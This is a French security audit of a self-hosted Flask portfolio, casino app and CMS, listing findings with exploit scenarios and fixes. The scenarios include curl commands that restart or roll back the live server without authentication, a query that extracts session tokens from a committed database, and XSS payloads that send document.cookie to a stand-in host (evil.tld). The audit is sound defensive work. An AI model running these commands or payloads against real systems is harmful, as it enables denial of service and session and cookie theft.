# Audit de sécurité — Portfolio `marienour.work`

| | |
|---|---|
| **Date** | 2026-05-20 |
| **Version auditée** | `0.4.5` — commit `be1827f` |
| **Périmètre** | `app.py` (Portfolio), `Casino/`, `SiteEntreprise/`, templates Jinja2, JS client, scripts de boot, configuration, historique git complet (105 commits) |
| **Stack** | Flask 3 / Python · SQLite · JS vanilla (Casino) + React/Vite (SiteEntreprise) · Waitress · tunnel Cloudflare |
| **Statut** | Phases 1–3 corrigées — cf. §11 *Journal des corrections*. Phases 4–5 à venir |

---

## 1. Résumé exécutif

L'application est un portfolio Flask auto-hébergé sur un PC personnel, exposé en
permanence sur internet via un tunnel Cloudflare. Il héberge trois entités : le
Portfolio lui-même (avec une zone admin et un système de mise à jour Git), une
app Casino multijoueur, et un site vitrine « Up Technologies » avec mini-CMS.

L'audit révèle **25 problèmes**, dont **3 critiques** et **5 élevés**. Les points
les plus graves confirment les inquiétudes exprimées :

- **Le mécanisme de mise à jour est déclenchable sans authentification.** Les
  endpoints `pull-from-404` et `rollback`, ainsi que `restart-internal`, sont
  appelables par n'importe qui sur internet (le garde-fou « même origine » et le
  garde-fou « IP locale » sont tous deux contournables). Un attaquant peut
  redémarrer le serveur en boucle (déni de service permanent), forcer un
  *downgrade* vers une version vulnérable, ou déclencher un `git pull`.
- **Une base SQLite vivante (`Casino/casino.db`) est versionnée dans le dépôt
  git**, exposant 19 jetons de session valides, des codes d'invitation et des
  données utilisateurs. Quiconque clone le dépôt obtient un accès admin Casino.
- **Aucune limitation anti-brute-force**, et le mot de passe par défaut est
  `admin` sur les trois entités.

La bonne nouvelle : les fondamentaux « classiques » sont sains — **pas
d'injection SQL** (requêtes paramétrées partout), **pas de SSTI**, **pas de
désérialisation dangereuse**, échappement Jinja2 et `escapeHtml` cohérents, et
les mots de passe Casino/SiteEntreprise sont correctement hachés (PBKDF2 /
werkzeug). Les failles sont concentrées sur **l'authentification**, la **chaîne
de déploiement** et l'**hygiène des secrets** — pas sur la logique métier de base.

### Tableau de synthèse

| ID | Sévérité | Titre | Fichier principal |
|----|----------|-------|-------------------|
| C1 | 🔴 Critique | Base SQLite `casino.db` versionnée (fuite de jetons de session) | `Casino/casino.db` |
| C2 | 🔴 Critique | `pull-from-404` & `rollback` déclenchables sans authentification | `app.py:358,387` |
| C3 | 🔴 Critique | Chaîne de mise à jour = exécution de code distante (RCE) | `app.py:266,358` |
| H1 | 🟠 Élevée | `restart-internal` : contrôle d'IP inopérant derrière le tunnel | `app.py:474` |
| H2 | 🟠 Élevée | Aucun anti-brute-force + mots de passe par défaut `admin` | `app.py:189` |
| H3 | 🟠 Élevée | Stored XSS via le CMS (`dangerouslySetInnerHTML`) | `SiteEntreprise/src/admin/Editable.jsx:141` |
| H4 | 🟠 Élevée | Upload de SVG → Stored XSS | `SiteEntreprise/site_app.py:53` |
| H5 | 🟠 Élevée | Mot de passe admin Portfolio + `secret_key` stockés en clair | `app.py:39,446` |
| M1 | 🟡 Moyenne | En-têtes de sécurité HTTP absents (CSP, X-Frame-Options…) | `app.py:118` |
| M2 | 🟡 Moyenne | Cookie de session Portfolio sans `Secure` ni `SameSite` | `app.py:106` |
| M3 | 🟡 Moyenne | Protection CSRF incohérente / absente sur plusieurs endpoints | `app.py:351,435,539` |
| M4 | 🟡 Moyenne | Changement de mot de passe sans vérifier l'ancien | `app.py:435` |
| M5 | 🟡 Moyenne | Casino : auto-crédit illimité de jetons | `Casino/casino_app.py:405` |
| M6 | 🟡 Moyenne | Casino multijoueur : aucune auth, usurpation de joueur, DoS rooms | `Casino/casino_app.py:489` |
| M7 | 🟡 Moyenne | Épuisement du pool de threads Waitress via SSE | `app.py:747` |
| M8 | 🟡 Moyenne | Serveur lié à `0.0.0.0` (contournement du tunnel en LAN) | `app.py:747,749` |
| M9 | 🟡 Moyenne | `debug=True` en mode dev (console Werkzeug = RCE) | `app.py:749` |
| M10 | 🟡 Moyenne | Dépendances non figées + `pip install` à chaque pull | `requirements.txt` |
| M11 | 🟡 Moyenne | Hook auto-push `git add -A` → `main` sans revue | `.claude/settings.json` |
| M12 | 🟡 Moyenne | Open redirect sur `/login?next=` | `app.py:198` |
| L1 | 🟢 Faible | `/api/deploy/health` : divulgation non authentifiée | `app.py:416` |
| L2 | 🟢 Faible | `api_invite_info` divulgue `is_admin` avant redemption | `Casino/casino_app.py:251` |
| L3 | 🟢 Faible | `X-Forwarded-For` de confiance pour l'IP client | `Casino/casino_app.py:69` |
| L4 | 🟢 Faible | `boot_portfolio.ps1` : chemin absolu / nom d'utilisateur en clair | `boot_portfolio.ps1:7` |
| L5 | 🟢 Faible | Messages d'erreur git renvoyés au client | `app.py:288,320` |

---

## 2. Méthode

- Revue manuelle complète des 5 fichiers Python cœur (`app.py`, `casino_app.py`,
  `casino_db.py`, `site_app.py`, `site_db.py`), des 8 templates, des scripts de
  boot et de la configuration.
- Deux agents d'exploration lancés en parallèle, par axe :
  - **Historique git / secrets** — scan des 105 commits pour clés, jetons, fichiers
    sensibles versionnés.
  - **XSS côté client** — analyse des 12 fichiers JS du Casino, du code React de
    SiteEntreprise et des JS du Portfolio (sinks DOM, flux de données non fiables).
- Croisement des résultats : les deux agents et la revue manuelle **convergent,
  aucune contradiction** à trancher. L'agent XSS et la revue manuelle confirment
  tous deux que la chaîne « relais SSE → client » ne produit pas de XSS direct
  (les noms sont échappés) mais bien un problème d'intégrité (M6) ; et que le seul
  vrai XSS stocké est côté CMS React (H3).
- Référentiel : OWASP Top 10 (injection, auth cassée, XSS, CSRF, SSRF, contrôle
  d'accès, mauvaise configuration, désérialisation, composants vulnérables,
  logging).

---

## 3. Bonnes pratiques déjà en place

À porter au crédit du projet — ces points sont **corrects** et n'ont pas besoin
d'être touchés :

- ✅ **Pas d'injection SQL.** Toutes les requêtes (`casino_db.py`, `site_db.py`)
  utilisent des paramètres liés. `update_user` construit sa clause `SET` à partir
  d'une **liste blanche** de colonnes (`casino_db.py:168`) — pas d'injection de
  nom de colonne possible.
- ✅ **Hachage correct des mots de passe Casino & SiteEntreprise.** PBKDF2-SHA256
  100 000 itérations avec sel aléatoire (`casino_db.py:411`), `werkzeug
  generate_password_hash` pour SiteEntreprise (`site_db.py:48`).
- ✅ **Génération d'identifiants robuste.** Module `secrets` partout : jetons de
  session 24 octets, jetons d'invitation 20 octets, codes via `secrets.choice`.
- ✅ **Comparaisons à temps constant** (`secrets.compare_digest`) pour le code
  d'invitation, l'identifiant et le mot de passe admin Casino.
- ✅ **Pas de SSTI ni de désérialisation dangereuse.** Aucun
  `render_template_string` sur de l'entrée utilisateur, aucun `pickle` /
  `yaml.load` / `eval` / `new Function`.
- ✅ **Échappement de sortie cohérent.** Auto-échappement Jinja2 ; côté JS, helper
  `escapeHtml` systématique et usage de `textContent` / `createElement` pour les
  données utilisateur (timeline des demandes, noms de joueurs).
- ✅ **Cookie Casino bien configuré** : `HttpOnly` + `SameSite=Lax` + `Secure`
  quand HTTPS (`casino_app.py:86`).
- ✅ **Page d'erreur 500 propre** : message générique, `error_id` aléatoire, pas
  de stack trace exposée, exception loggée côté serveur (`app.py:721`).
- ✅ **Upload partiellement durci** : `secure_filename`, liste blanche
  d'extensions, plafond 8 Mo, nom de fichier aléatoire (`uuid4`) — pas de path
  traversal sur l'écriture. (Le problème restant est le SVG, cf. H4.)
- ✅ **`send_from_directory`** pour le statique (jointure de chemin sécurisée).
- ✅ **`SECRET_KEY`** issue d'une variable d'env ou générée aléatoirement et
  persistée — **jamais codée en dur, jamais dans git** (vérifié sur tout
  l'historique).
- ✅ **Pas de CORS permissif** : aucune en-tête `Access-Control-Allow-Origin`,
  donc pas de mauvaise configuration CORS.
- ✅ **Journal financier immuable** : `chip_log` en insertion seule.
- ✅ **`.gitignore`** couvre `.env`, `mnwork.yml`, `.portfolio_config.json`,
  `admin_pass.json`, `site_users.db*`.

---

## 4. Failles critiques

### C1 — Base SQLite `casino.db` versionnée dans le dépôt git 🔴

**Fichier** : `Casino/casino.db` (suivi par git à `HEAD`) — chemin défini dans
`Casino/casino_db.py:23`.

**Description.** La base SQLite *de production* du Casino est committée dans le
dépôt. Le scan d'historique confirme qu'elle est présente à `HEAD` et dans
6 révisions (ajoutée au commit `1662418`, modifiée jusqu'à `be1827f`). Elle
contient :

- **19 jetons de session valides** (table `sessions`) — ce sont des
  *credentials porteurs* : présenter le jeton = être authentifié.
- Des **jetons et codes d'invitation** (table `invites`).
- Les **données utilisateurs** (noms, soldes de jetons), des **adresses IP**, et
  potentiellement le **hash du mot de passe admin** (`kv_settings`) s'il a été
  changé.

C'est la conséquence directe de deux causes : `.gitignore` ne contient **aucun
motif `*.db`**, et le hook auto-push fait `git add -A` (cf. M11).

**Scénario d'exploit.**
```bash
git clone https://github.com/AntoineBinet/ProjetPortefolio
sqlite3 ProjetPortefolio/Casino/casino.db "SELECT token, user_id, expires_at FROM sessions;"
# → place un jeton non expiré dans le cookie : casino_session=<token>
# → accès direct au compte (admin si le jeton appartient à l'admin)
```
Les jetons restent dans l'historique git **même après suppression du fichier** :
un simple `git log` les récupère.

**Correctif proposé.**
1. `git rm --cached Casino/casino.db` (le fichier se régénère seul au démarrage).
2. Ajouter à `.gitignore` : `*.db`, `*.sqlite`, `*.sqlite3`, `*.db-journal`,
   `*.db-wal`, `*.db-shm`.
3. **Invalider** toutes les sessions et invitations existantes (`DELETE FROM
   sessions; DELETE FROM invites;` ou suppression/régénération du fichier).
4. **Purger l'historique git** (BFG / `git filter-repo`) — ⚠️ **action
   destructive avec force-push, nécessite ta validation explicite**.
5. Restreindre les permissions du fichier (`chmod 600` / ACL).

---

### C2 — `pull-from-404` & `rollback` déclenchables sans authentification 🔴

**Fichiers** : `app.py:358` (`api_deploy_pull_from_404`), `app.py:387`
(`api_deploy_rollback`), `app.py:161-176` (`_require_same_origin`).

**Description.** Ces deux endpoints n'ont **pas de décorateur `@login_required`**.
Leur seule protection est `_require_same_origin()`. Or cette fonction est
**fail-open** :

```python
def _require_same_origin():
    origin  = request.headers.get("Origin") or ""
    referer = request.headers.get("Referer") or ""
    ...
    if origin  and not ...: return 403   # bloque seulement SI Origin présent
    if not origin and referer and not ...: return 403
    return None                          # AUCUN header → autorisé
```

Un navigateur attache toujours un `Origin` sur une requête POST cross-site — donc
le CSRF *navigateur* est bien bloqué. Mais **un client non-navigateur (curl,
script Python) n'envoie ni `Origin` ni `Referer`** → la fonction retourne `None`
→ la requête passe. Ces endpoints sont donc, en pratique, **publics pour tout
attaquant scripté**.

**Scénario d'exploit.**
```bash
# Déni de service permanent — redémarre le serveur en boucle :
while true; do curl -s -X POST https://marienour.work/api/deploy/rollback; done

# Downgrade : revient au commit stocké dans .last_commit_hash (ou HEAD~1),
# potentiellement une version vulnérable, puis redémarre :
curl -X POST https://marienour.work/api/deploy/rollback

# Force un git fetch + pull/reset --hard origin/main + restart :
curl -X POST https://marienour.work/api/deploy/pull-from-404
```
Aucun cookie, aucune authentification. Le service peut être maintenu hors ligne
indéfiniment, ou ramené à une version connue comme faillible avant exploitation.

**Correctif proposé.**
- Exiger `@login_required` sur **tous** les endpoints `/api/deploy/*` qui
  modifient l'état ou redémarrent.
- Rendre `_require_same_origin()` **fail-closed** : refuser si `Origin` *et*
  `Referer` sont tous deux absents sur une requête mutante.
- Repenser l'UX de la page 404 « Réparer & redémarrer » : un mécanisme de
  réparation qui fait `git pull` + restart **ne doit pas** être anonyme (cf.
  questions de la Phase 1).

---

### C3 — Chaîne de mise à jour = exécution de code distante 🔴

**Fichiers** : `app.py:266` (`api_deploy_pull`), `app.py:358`
(`pull-from-404`), `app.py:315-332` (`git pull` + `pip install`),
`app.py:228-253` (`_schedule_restart`).

**Description.** Le système de MAJ tire et exécute du code depuis `origin/main`
sur GitHub :

1. `git fetch` + `git pull --ff-only` (ou `git reset --hard origin/main` en
   repli) ;
2. `pip install -r requirements.txt` (uniquement sur le `pull` authentifié) ;
3. redémarrage du process, qui **exécute le code fraîchement tiré**.

**Aucune vérification d'intégrité** : pas de signature de commit/tag, pas de pin
de version. La racine de confiance est entièrement « quiconque peut écrire sur
`origin/main` ». Or cette barre est basse :

- le hook auto-push (M11) pousse du WIP directement sur `main`, sans revue ;
- un `requirements.txt` empoisonné = installation de paquet arbitraire = RCE ;
- combiné à **C2**, un attaquant *non authentifié* peut **déclencher** le pull à
  volonté au lieu d'attendre une MAJ légitime.

**Scénario d'exploit.** Un attaquant qui obtient un accès en écriture au dépôt
(compromission du compte GitHub, PR malveillante fusionnée, jeton CI fuité)
pousse un commit modifiant `app.py` ou `requirements.txt`. Il appelle ensuite
`curl -X POST https://marienour.work/api/deploy/pull-from-404` (cf. C2). Le
serveur tire le code malveillant et le **lance au redémarrage** → exécution de
code arbitraire sur le PC auto-hébergé (qui héberge aussi ProspUp).

**Correctif proposé.**
- Authentifier le déclenchement (C2) — première barrière.
- Figer les dépendances avec hash (`pip install --require-hashes`, cf. M10).
- **Défense en profondeur (Phase 5, nécessite ton action)** : signer les commits
  en GPG et faire vérifier la signature par le serveur avant tout `pull`
  (`git verify-commit`). Refuser de tirer un commit non signé.
- Mettre une protection de branche sur `main` côté GitHub (revue obligatoire,
  pas de push direct).

---

## 5. Failles élevées

### H1 — `restart-internal` : contrôle d'IP inopérant derrière le tunnel 🟠

**Fichier** : `app.py:474-480`.

**Description.** L'endpoint se veut « réseau local uniquement » :
```python
remote = request.environ.get("REMOTE_ADDR") or request.remote_addr or ""
if remote not in ("127.0.0.1", "::1"):
    return jsonify(ok=False, error="Accès refusé — réseau local uniquement"), 403
```
Mais `ProxyFix` est configuré `x_proto=1, x_host=1` **sans `x_for`**
(`app.py:109`). `REMOTE_ADDR` n'est donc **pas réécrit** : il vaut l'IP du pair
TCP réel, c'est-à-dire le process `cloudflared` local. Comme le tunnel se
connecte à `localhost:8001`, **toute requête venue d'internet via le tunnel a
`remote_addr == 127.0.0.1`**. Le contrôle « IP locale » est donc toujours vrai.

**Scénario d'exploit.**
```bash
curl -X POST https://marienour.work/api/deploy/restart-internal
# Le serveur voit 127.0.0.1 → contrôle passé → redémarrage
```
Déni de service non authentifié, en boucle.

**Correctif proposé.** Exiger une authentification. Si un endpoint réellement
« loopback only » est nécessaire, l'exposer sur un *listener séparé* lié à
`127.0.0.1` (et non accessible au tunnel) — ne jamais se fier à `remote_addr`
derrière un proxy/tunnel.

---

### H2 — Aucun anti-brute-force + mots de passe par défaut `admin` 🟠

**Fichiers** : `app.py:189` (`/login`), `Casino/casino_app.py:183`
(`admin-login`), `Casino/casino_app.py:267` (`redeem`),
`SiteEntreprise/site_app.py:116` (`login`).

**Description.** Aucun endpoint d'authentification n'a de limitation de débit, de
verrouillage de compte ni de backoff progressif :

- `/login` (Portfolio) : aucun délai, comparaison `==` en clair.
- `/casino/api/auth/admin-login` : un `time.sleep(0.5)` fixe, pas de
  verrouillage — les requêtes concurrentes contournent le délai.
- `/casino/api/auth/redeem` : `time.sleep(0.4)`, code à 6 caractères
  brute-forçable en parallèle.
- `/site-entreprise/api/auth/login` : rien du tout.

Et le **mot de passe par défaut est `admin`** sur les trois entités
(`app.py:39`, `casino_db.py:449`, `site_db.py:24`). Le forçage du changement
(`must_change_password`) n'est appliqué que **côté UI** : le backend continue
d'accepter `admin` tant qu'aucun nouveau mot de passe n'est posé.

**Scénario d'exploit.** Un attaquant teste `admin/admin` sur `/login` — succès
immédiat si le mot de passe n'a jamais été changé. Sinon, il lance un
brute-force par dictionnaire sans aucune entrave (ni captcha, ni lockout, ni
délai pour le Portfolio).

**Correctif proposé.**
- Limitation de débit sur tous les endpoints d'auth (par IP **et** par compte) +
  verrouillage temporaire / backoff exponentiel après N échecs.
- Refuser le mot de passe par défaut **côté backend** : si `admin` est encore
  actif, n'autoriser que l'écran de changement de mot de passe.
- Comparaison à temps constant pour le Portfolio (`secrets.compare_digest`).

---

### H3 — Stored XSS via le CMS (`dangerouslySetInnerHTML`) 🟠

**Fichiers** : `SiteEntreprise/src/admin/Editable.jsx:141-142` et `:158` ;
source des données : `SiteEntreprise/site_app.py:84-88` (`_save_content`) et
`:98-106` (`POST /api/content`).

**Description.** Huit champs du CMS sont rendus en HTML brut via
`dangerouslySetInnerHTML` (ex. `hero.sub`, `*.titleHtml`, `splitTitleHtml`). Ces
champs proviennent de `GET /site-entreprise/api/content`, dont le contenu est
écrit *verbatim* par `_save_content` — `POST /api/content` ne fait **aucune
sanitisation** (seul contrôle : `isinstance(data, dict)`). React n'échappe rien
dans un `dangerouslySetInnerHTML`.

**Scénario d'exploit.** Un admin (ou quiconque obtient le mot de passe
SiteEntreprise — rappel : défaut `admin`) enregistre :
```
hero.sub = <img src=x onerror="fetch('https://evil.tld/c?'+document.cookie)">
```
Le payload s'exécute **chez chaque visiteur** du site public, sans aucun
privilège requis côté victime. XSS stocké, persistant.

**Correctif proposé.** Sanitiser à l'écriture côté serveur (`bleach` avec une
liste blanche de balises type `<em> <strong> <br>`) **et/ou** passer le contenu
dans DOMPurify avant le `dangerouslySetInnerHTML`. Décision à trancher : garder
un sous-ensemble de HTML ou tout passer en texte brut (cf. Phase 3).

---

### H4 — Upload de SVG → Stored XSS 🟠

**Fichiers** : `SiteEntreprise/site_app.py:53` (`_ALLOWED_IMAGE_EXT` inclut
`.svg`), `:151-169` (`api_upload`), `:172-176` (`serve_upload`).

**Description.** L'upload accepte les fichiers `.svg`. Un SVG est un document
XML qui peut contenir `<script>` et des gestionnaires d'événements. Servi
*inline* depuis la même origine que tout le reste (`/site-entreprise/uploads/…`,
`send_from_directory`, sans `Content-Disposition`), il s'exécute dans le contexte
de `marienour.work`.

**Scénario d'exploit.** Un admin upload `logo.svg` contenant :
```xml
<svg xmlns="http://www.w3.org/2000/svg"><script>
  fetch('https://evil.tld/?c='+document.cookie)
</script></svg>
```
Toute victime ouvrant `/site-entreprise/uploads/<uuid>.svg` (lien partagé,
`<img>` non, mais navigation directe ou `<embed>`/`<object>`) exécute le script
sur l'origine principale.

**Correctif proposé.** Retirer `.svg` de la liste blanche **ou** servir les
uploads avec `Content-Disposition: attachment` + `Content-Security-Policy:
default-src 'none'` + idéalement depuis un domaine/origine séparé. Le plus simple
et sûr : interdire le SVG.

---

### H5 — Mot de passe admin Portfolio + `secret_key` stockés en clair 🟠

**Fichiers** : `app.py:39` (défaut), `app.py:76-77` (chargement),
`app.py:195` (comparaison), `app.py:443-447` (écriture),
`app.py:84-91` (`secret_key`).

**Description.** Contrairement au Casino et à SiteEntreprise (qui hachent), le
Portfolio gère son mot de passe admin **en clair** :

- `ADMIN_PASS` est une chaîne en clair en mémoire ;
- `api_change_password` écrit `cfg["admin_pass"] = new_pass` **en clair** dans
  `.portfolio_config.json` ;
- le login compare `p == ADMIN_PASS` (clair, non temps-constant).

Le **même fichier** stocke aussi la `secret_key` Flask en clair. `.portfolio_config.json`
est bien gitignoré, mais sa fuite par un autre canal (sauvegarde non chiffrée,
mauvaise permission, copie accidentelle, autre process sur la machine) donne :
mot de passe admin **+** clé de signature des sessions → **usurpation de session
sans même connaître le mot de passe**.

**Scénario d'exploit.** Un attaquant lit `.portfolio_config.json` (via une
sauvegarde exposée, ou une autre faille de lecture de fichier) : il récupère le
mot de passe admin **et** la `secret_key`, avec laquelle il forge un cookie de
session admin valide.

**Correctif proposé.** Hacher le mot de passe admin Portfolio (PBKDF2 ou
`werkzeug`, comme les deux autres entités). Ne jamais stocker de mot de passe en
clair. Restreindre les permissions de `.portfolio_config.json` (`chmod 600`).
Comparaison à temps constant.

---

## 6. Failles moyennes

### M1 — En-têtes de sécurité HTTP absents 🟡
**Fichier** : `app.py:118-125` (`_no_cache_html`, seul `after_request`).
Aucune en-tête `Content-Security-Policy`, `X-Frame-Options` /
`frame-ancestors`, `X-Content-Type-Options`, `Referrer-Policy`,
`Strict-Transport-Security`, `Permissions-Policy`.
**Exploit** : absence de `X-Frame-Options` → la page `/admin/parametres`
(boutons MAJ / Rollback / Restart) peut être chargée dans une iframe invisible
sur un site malveillant → **clickjacking** : on piège l'admin pour qu'il clique
« Rollback ». L'absence de CSP laisse toute XSS s'exécuter sans entrave.
**Correctif** : ajouter ces en-têtes globalement (`after_request`). CSP à
calibrer (polices Google, iframes d'aperçu) — cf. Phase 3.

### M2 — Cookie de session Portfolio sans `Secure` ni `SameSite` 🟡
**Fichier** : `app.py:106` (`app.secret_key`) — aucune config
`SESSION_COOKIE_*`. Flask met `HttpOnly` par défaut mais **pas `Secure`** et
**pas `SameSite`**. Le cookie admin est donc envoyé en cross-site (surface CSRF,
cf. M3) et pourrait fuiter sur une connexion HTTP.
**Correctif** : `SESSION_COOKIE_SECURE=True`, `SESSION_COOKIE_SAMESITE="Lax"`,
`SESSION_COOKIE_HTTPONLY=True` explicite. (Le cookie *Casino* est, lui, bien
configuré — incohérence à corriger côté Portfolio.)

### M3 — Protection CSRF incohérente / absente 🟡
**Fichiers** : `app.py:351` (`restart`), `app.py:435` (`change-password`),
`app.py:539` (`launch-prospup`). Ces endpoints authentifiés n'appellent **pas**
`_require_same_origin()`. `restart` et `launch-prospup` ne lisent aucun corps →
une simple `<form>` cross-site auto-soumise déclenche l'action si l'admin est
connecté.
**Exploit** : un site malveillant visité par l'admin connecté redémarre le
serveur (ou lance ProspUp) via un POST cross-site.
**Correctif** : protection CSRF uniforme — idéalement jetons CSRF (Flask-WTF) ou
a minima `_require_same_origin()` *fail-closed* partout, combiné à
`SameSite=Lax` (M2).

### M4 — Changement de mot de passe sans vérifier l'ancien 🟡
**Fichier** : `app.py:435-448`. `api_change_password` n'exige que `_logged_in()`
— **pas l'ancien mot de passe**, longueur minimale 4. N'importe quelle session
active (ou une XSS dans la zone admin) change le mot de passe admin sans le
connaître → verrouillage / prise de contrôle.
**Correctif** : exiger le mot de passe actuel, augmenter la longueur minimale,
ajouter la protection CSRF (M3).

### M5 — Casino : auto-crédit illimité de jetons 🟡
**Fichier** : `Casino/casino_app.py:405-418` (`api_chips_cashout`). Tout
utilisateur authentifié peut ajuster **son propre** solde de `delta` borné à
±100 000, **sans limite de fréquence** et **sans validation d'un état de jeu
côté serveur**.
**Exploit** : `POST /casino/api/chips/cashout {"delta": 100000}` en boucle →
solde arbitrairement grand. Défait la gestion des jetons par l'admin. Impact
limité à l'économie interne du jeu (monnaie fictive), mais c'est un contrôle
d'accès cassé.
**Correctif** : valider le gain côté serveur (nécessite un état de jeu serveur),
ou au minimum plafonner par fenêtre de temps et auditer.

### M6 — Casino multijoueur : aucune auth, usurpation, DoS rooms 🟡
**Fichier** : `Casino/casino_app.py:489-647`. Les endpoints `room/*` n'ont ni
authentification ni contrôle d'origine. Le `player_id` et le `host_id` sont
diffusés à tous les participants via SSE — n'importe quel joueur peut alors
appeler `room/action`, `room/leave`, `room/start` en se faisant passer pour un
autre. De plus, `room/create` n'a aucune limite → création illimitée de rooms en
mémoire (`_rooms`), `_gc_rooms` ne nettoyant qu'après 2 h d'inactivité.
**Exploit** : usurpation d'autres joueurs (tricher, expulser, fausser l'état) ;
ou épuisement mémoire par création massive de rooms.
**Correctif** : lier chaque room à des sessions, ne pas diffuser les `player_id`
en clair, plafonner le nombre de rooms et le débit de création.

### M7 — Épuisement du pool de threads Waitress via SSE 🟡
**Fichier** : `app.py:747` — `serve(app, ..., threads=8)`. L'app utilise
abondamment le SSE (`/api/deploy/pull`, `/casino/api/room/<code>/stream`), or
chaque flux SSE **monopolise un thread** pour toute sa durée de vie. Avec
seulement 8 threads, **8 connexions SSE longues bloquent tout le serveur**.
**Exploit** : ouvrir 8 flux `/casino/api/room/<code>/stream` → le serveur ne
répond plus à aucune autre requête. DoS trivial.
**Correctif** : augmenter `threads`, plafonner les connexions SSE concurrentes
par IP, et/ou ajouter un timeout sur les flux.

### M8 — Serveur lié à `0.0.0.0` 🟡
**Fichier** : `app.py:747` et `:749` — `host="0.0.0.0"`. L'app n'a besoin
d'écouter que sur `127.0.0.1` (le tunnel s'y connecte). En `0.0.0.0`, toute
machine du réseau local peut joindre `:8001` **directement**, court-circuitant
le tunnel Cloudflare (et toute règle WAF / Access posée côté Cloudflare).
**Correctif** : `host="127.0.0.1"`.

### M9 — `debug=True` en mode dev 🟡
**Fichier** : `app.py:749` — `app.run(host="0.0.0.0", port=PORT, debug=True)`.
En mode dev, la console interactive Werkzeug est active = **exécution de code**
si elle est atteignable. Le tunnel pointe sur `:8001` quel que soit le mode :
lancer `python app.py` (sans `--prod`) pendant que le tunnel tourne expose la
console sur internet.
**Correctif** : ne jamais utiliser `debug=True` avec `host` non-loopback ;
désactiver le debugger même en dev, ou s'assurer que le tunnel est coupé en dev.

### M10 — Dépendances non figées + `pip install` à chaque pull 🟡
**Fichier** : `requirements.txt` — `flask>=3.0`, `waitress>=3.0`. Versions non
épinglées, et `pip install -r requirements.txt` tourne à chaque MAJ
(`app.py:327`). Une dépendance compromise ou une nouvelle version régressive est
installée automatiquement.
**Correctif** : épingler les versions exactes + hashes (`pip-compile`,
`--require-hashes`).

### M11 — Hook auto-push `git add -A` → `main` sans revue 🟡
**Fichier** : `.claude/settings.json` — hook `Stop` :
`git add -A && git commit && git push origin main`. C'est la **cause racine de
C1** (la DB a été aspirée par `git add -A`). Pousser du WIP non revu directement
sur `main`, combiné à C3, met du code non vérifié en production immédiatement.
**Correctif** : au minimum, ne jamais utiliser `git add -A` (lister les chemins,
ou s'appuyer sur un `.gitignore` solide) ; idéalement, pousser sur une branche de
travail et non `main`. *Note : le `CLAUDE.md` indique que le risque de push WIP a
été accepté en connaissance de cause — la recommandation porte surtout sur le
`git add -A` aveugle.*

### M12 — Open redirect sur `/login?next=` 🟡
**Fichier** : `app.py:198` — `redirect(request.args.get("next") or
url_for("admin_parametres"))`. Le paramètre `next` est passé tel quel à
`redirect()`.
**Exploit** : `https://marienour.work/login?next=https://evil.tld` — après un
login réussi, la victime est redirigée vers le site de l'attaquant (hameçonnage
crédibilisé par le domaine légitime).
**Correctif** : n'accepter que des chemins relatifs (`next` doit commencer par
`/` et ne pas être `//` ou contenir un schéma).

---

## 7. Failles faibles

### L1 — `/api/deploy/health` : divulgation non authentifiée 🟢
**Fichier** : `app.py:416-432`. Endpoint sans authentification renvoyant le
hash du commit courant, la version, l'état de rollback, l'heure serveur. Un
attaquant apprend la version exacte (donc les vulnérabilités applicables).
**Correctif** : exiger l'authentification, ou réduire les informations.

### L2 — `api_invite_info` divulgue `is_admin` 🟢
**Fichier** : `Casino/casino_app.py:251-264`. Avec le seul `iid` d'invitation
(sans le code), on apprend si l'invitation accorde les droits admin et le nombre
de jetons.
**Correctif** : ne renvoyer que le strict nécessaire à l'écran de redemption.

### L3 — `X-Forwarded-For` de confiance pour l'IP client 🟢
**Fichier** : `Casino/casino_app.py:69` — `_client_ip` lit `X-Forwarded-For`
sans validation. L'IP est usurpable ; elle n'est utilisée que pour le log
`sessions.ip`, mais cela pollue l'audit.
**Correctif** : dériver l'IP de la couche proxy de confiance (ProxyFix), ne pas
faire confiance à l'en-tête brut.

### L4 — `boot_portfolio.ps1` : chemin / utilisateur en clair 🟢
**Fichier** : `boot_portfolio.ps1:7` — `C:\Users\binet\Desktop\Portfolio`
codé en dur (et fichier versionné). Divulgue le nom d'utilisateur Windows
(`binet`) et l'arborescence. Pas un secret, mais une info utile à un attaquant.
**Correctif** : dériver le chemin dynamiquement (`$PSScriptRoot`).

### L5 — Messages d'erreur git renvoyés au client 🟢
**Fichier** : `app.py:288`, `:320`, `:380`, `:413` — `fetch.stderr`,
`reset.stderr`, `str(e)` renvoyés dans la réponse SSE/JSON. Peut divulguer des
chemins absolus et des détails internes. Endpoints admin, donc impact limité.
**Correctif** : journaliser le détail côté serveur, renvoyer un message
générique au client.

---

## 8. Chiffrement : transit & repos — évaluation réaliste

Tu as demandé une réponse honnête sur ce qui vaut le coup vs pas.

**En transit — globalement OK, deux ajustements faciles.**
Le HTTPS visiteur ↔ Cloudflare est assuré par Cloudflare. Le saut
`cloudflared` ↔ Flask est en HTTP clair mais sur la *loopback* (`127.0.0.1`) —
c'est normal et acceptable. Manques réels et faciles à corriger : **HSTS absent**
(M1) et **cookie de session Portfolio non `Secure`** (M2). Rien de lourd.

**Au repos — ne pas sur-investir.**
Les bases SQLite et les JSON de config sont en clair sur le disque. Faut-il
chiffrer la base (SQLCipher) ? **Honnêtement, non, mauvais rapport
effort/bénéfice ici.** Le chiffrement de base de données protège contre le vol
du *fichier seul* (disque volé, sauvegarde égarée). Mais la clé doit être lisible
par le process au démarrage → elle vit sur la **même machine**. Contre le
scénario réaliste (le PC auto-hébergé est compromis), l'attaquant a la clé en
même temps que la base : le chiffrement ne protège quasiment rien, pour un coût
opérationnel réel (gestion de clé, risque de se verrouiller dehors).

Ce qui est **réaliste et utile** au repos, par ordre de priorité :
1. **Ne jamais versionner les bases** (C1) — c'est *le* vrai problème ici.
2. **Hacher tous les mots de passe** — le Portfolio ne le fait pas (H5).
3. **Permissions de fichiers restrictives** sur `.portfolio_config.json`,
   `casino.db`, `admin_pass.json`, `.demandes_modifs.json`.
4. **Chiffrer les sauvegardes** si tu en fais : là, oui — une archive de backup
   quitte la machine, donc `gpg`/`age` sur l'archive a du sens.

**Clés API.** Le scan d'historique confirme qu'il n'y a *aucune* clé API tierce
dans le projet aujourd'hui. Si tu en ajoutes (service IA, etc.), passe par des
variables d'environnement — jamais dans `content.json` ni un fichier versionné.

---

## 9. Plan d'action priorisé

Correction **par phases**, avec validation entre chacune. Les questions de choix
(UX, compromis) sont posées **avant** de coder chaque phase.

### Phase 0 — Actions immédiates de ton côté (hors code)
- **Confirmer la visibilité du dépôt GitHub** (public/privé). Si public : C1 est
  une fuite publique en cours.
- **Changer les 3 mots de passe admin** (Portfolio, Casino, SiteEntreprise) —
  abandonner `admin`.
